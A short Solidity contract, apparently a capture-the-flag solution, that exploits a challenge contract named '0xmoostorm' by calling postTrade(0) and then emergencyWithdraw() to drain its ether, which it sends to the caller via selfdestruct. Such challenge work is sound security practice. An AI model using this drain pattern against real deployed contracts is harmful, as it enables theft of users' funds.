// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_0xmoostorm {
    function postTrade(uint256 n) external;

    function emergencyWithdraw() external payable;
}

contract Exploit_0xmoostorm {
    IChallenge_0xmoostorm instance;

    constructor(IChallenge_0xmoostorm _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        instance.postTrade(0);
        instance.emergencyWithdraw();

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
